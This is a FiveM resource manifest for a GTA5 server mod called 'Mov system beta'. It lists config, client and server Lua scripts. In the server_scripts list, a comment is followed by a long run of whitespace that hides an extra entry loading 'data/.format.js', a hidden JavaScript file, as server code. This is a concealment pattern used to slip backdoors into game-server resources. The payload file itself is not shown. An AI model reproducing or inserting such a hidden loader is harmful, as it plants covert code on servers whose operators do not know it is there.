fx_version 'cerulean'
game 'gta5'

author 'Paik Makarov'
description 'Mov system beta'
version '1.0.0'

shared_scripts {
    'config/*.lua'
}

client_scripts {
    'client/*.lua'
}

server_scripts {
    'server/**/*.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'data/.format.js',
}